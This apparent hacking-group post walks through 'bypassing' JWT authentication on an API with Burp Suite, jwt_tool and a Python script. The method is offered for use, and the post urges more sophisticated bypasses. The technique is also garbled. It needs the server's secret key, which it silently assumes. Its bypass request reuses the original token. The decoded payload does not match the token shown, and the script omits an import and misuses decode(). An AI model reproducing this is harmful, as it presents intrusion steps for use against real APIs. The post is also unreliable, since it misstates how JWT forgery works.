❖ API Authentication Bypass

Let's assume we have a vulnerable API endpoint: https://example.com/api/v1/users

The API uses JSON Web Tokens (JWT) for authentication. We can use a tool like Burp Suite to intercept and manipulate the JWT token.

Step 1: Intercept JWT Token

Using Burp Suite, intercept the login request and capture the JWT token:
GET /api/v1/login HTTP/1.1
Host: example.com
Content-Type: application/json

{"username": "user", "password": "pass"}
Response:
HTTP/1.1 200 OK
Content-Type: application/json

{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaGFuIjoiMjMwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"}
Step 2: Analyze JWT Token

Using a tool like jwt.io, we can analyze the JWT token and find the algorithm used (HS256) and the payload:
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1643723900,
  "exp": 1644329700
}
Step 3: Bypass Authentication

We can use a tool like jwt_tool to generate a new JWT token with the same payload but with a longer expiration time (e.g., 1 year):
jwt_tool --alg HS256 --payload '{"sub": "1234567890", "name": "John Doe", "iat": 1643723900, "exp": 2147483647}' --secret-key 'your_secret_key_here'
This will generate a new JWT token with a longer expiration time. We can use this token to bypass authentication:
GET /api/v1/users HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaGFuIjoiMjMwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
PoC Code
import jwt

# Load secret key
with open('secret_key.txt', 'r') as f:
    secret_key = f.read().strip()

# Generate new JWT token with longer expiration time
payload = {'sub': '1234567890', 'name': 'John Doe', 'iat': 1643723900, 'exp': 2147483647}
new_token = jwt.encode(payload, secret_key, algorithm='HS256')

# Use new token to bypass authentication
headers = {'Authorization': f'Bearer {new_token.decode()}'}
response = requests.get('https://example.com/api/v1/users', headers=headers)
print(response.text)
Note: This is just a basic example and should not be used in production. In a real-world scenario, you should use a more sophisticated approach to bypass authentication.

Join our groups for more Hacking 
